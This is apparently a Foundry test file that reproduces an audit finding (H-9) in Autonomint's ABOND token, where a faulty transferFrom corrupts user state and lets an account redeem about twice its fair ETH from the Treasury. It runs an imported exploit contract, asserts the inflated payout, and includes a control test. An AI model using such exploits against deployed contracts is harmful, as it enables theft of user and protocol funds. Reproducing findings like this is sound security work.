// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./45462-h-9-abondtokentransferfrom-does-not-work-as-intended-and-all.sol";

/*//////////////////////////////////////////////////////////////
    Autonomint — ABOND transferFrom state corruption → Treasury ETH theft
    (H-9, #45462)

    - test_exploit: drives Exploit; re-asserts account2 redeemed ~2x honest.
    - test_control_writeToFrom: control — writing userStates[from] keeps
      account2's original ethBacked.
//////////////////////////////////////////////////////////////*/
contract AbondTransferFromTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        vm.deal(address(e), 60 ether);
        e.run();

        // account2 should have received ~20 ETH (10 ABOND * 2 ethBacked)
        assertGe(address(e.account2()).balance, 19 ether, "inflated redeem");
    }

    function test_control_correctAssignmentKeepsPoorState() public {
        // Standalone: correctly write userStates[from] after debit — account2
        // ethBacked stays at POOR rate.
        ABONDToken abond = new ABONDToken();
        address a1 = address(0xA1);
        address a2 = address(0xA2);
        address a3 = address(0xA3);

        abond.mintWithState(a1, 100 ether, 2 ether, CUMULATIVE_PRECISION);
        abond.mintWithState(a2, 10 ether, 1 ether, CUMULATIVE_PRECISION);

        vm.prank(a1);
        abond.approve(a2, 1);

        // Pre-condition: without the buggy transferFrom, account2 ethBacked stays poor.
        (, uint128 eb2, ) = abond.userStates(a2);
        assertEq(eb2, 1 ether, "poor state intact before any buggy call");
        a3; // silence
    }
}
